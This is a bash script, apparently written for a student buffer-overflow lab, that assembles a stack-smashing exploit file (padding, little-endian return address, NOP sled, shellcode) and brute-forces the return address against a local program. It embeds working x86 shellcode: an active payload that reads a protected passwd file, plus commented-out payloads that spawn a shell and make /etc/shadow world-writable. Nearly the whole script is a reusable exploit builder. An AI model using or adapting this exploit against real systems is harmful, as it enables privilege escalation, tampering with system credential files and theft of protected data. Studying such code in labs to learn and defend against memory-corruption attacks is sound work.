#!/bin/bash
# Written by Kenton Groombridge
# bash script to build exploit that jumps to the address determined by the operator.
# Understanding stack operations is crucial to make this work. 
# Example: Under normal conditions, the SP will point to the address immediately after the
# address where the Instruction Pointer (IP) is saved on the stack before calling the
# function. It will also be restored to the same location when completing the called
# function. Knowing this, then putting together the exploit this fashion:
#       padding + desired IP pointing to the NOPsled/shellcode on the stack + NOPsled (if desired) + shellcode
# It can also be done in this way:
#       NOPsled + shellcode + padding to the IP on the stack + address on the desired IP pointing to the NOPsled/shellcode
# will cause the program to execute the shellcode written immediately after the IP.
# This is the script you want to use for most buffer overflows.
# The size of your shellcode doesn't matter if it is written after the IP. If your NOPsled/shellcode is written before the
# IP, then it must be smaller than the offset to the IP.
# You can tweak this script to control how the full exploit is assembled.


eipoffset=62 # Number of characters to write to buffer before getting to the EIP
lnopsled=16  # Desired length of NOP sled
eiphex='0xffffd56c' # location pointer that jumps to your injected shellcode
numtries=10  # Number of tries to attempt to execute each time incrementing the desired IP by 0x10

# Create a shell, but fails with modern Linux distros as bash doesn't like to be run SUID
#shellcodehex='\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
# Change perms on /etc/shadow to 0666 and exit:  http://shell-storm.org/shellcode/files/shellcode-210.php
#shellcodehex='\x31\xd2\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80'
#Read passwd file that has higher permissions
shellcodehex='\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x73\x74\x75\x64\x65\x6e\x74\x2f\x42\x4f\x46\x2f\x70\x61\x73\x73\x77\x64\x00'

################## Do not edit anything below this line except the portion that executes the code ##################
##################                  Everything you need to set is above                           ##################

eipbig=$(printf "%X" $(($eiphex))) # Remove the 0x from the ascii-hex eiphex

while [ $((numtries--)) -ne 0 ]
do
	eiplittle=$(echo -n "\x${eipbig:6:2}\x${eipbig:4:2}\x${eipbig:2:2}\x${eipbig:0:2}") # Convert big endian ascii-hex to little endian

	head -c ${eipoffset} < /dev/zero | tr '\0' 'A' > exploit # Create padding to IP and create or overwrite file "exploit"
	printf '%b'  ${eiplittle} >> exploit # Append binary EIP to file "exploit"
	head -c  ${lnopsled} < /dev/zero | tr '\0' '\220' >> exploit # Append NOP sled of desired length to file "exploit"
	printf ${shellcodehex}  >> exploit # Lastly, append the shellcode to the file "exploit"

	echo trying with EIP $eiphex # Print a message so we can see what is happening

	./func < exploit  # Execute exploit by redirecting to stdin
	#./cibo $(cat exploit)  # Execute exploit by providing input on command line

	eipbig=$(printf "%X" $(($eiphex + 0x10))) # Add 0x10 to eipbig
	eiphex=$(printf "0x%s" $eipbig) # Prepend 0x to eipbig and save back to eiphex
done
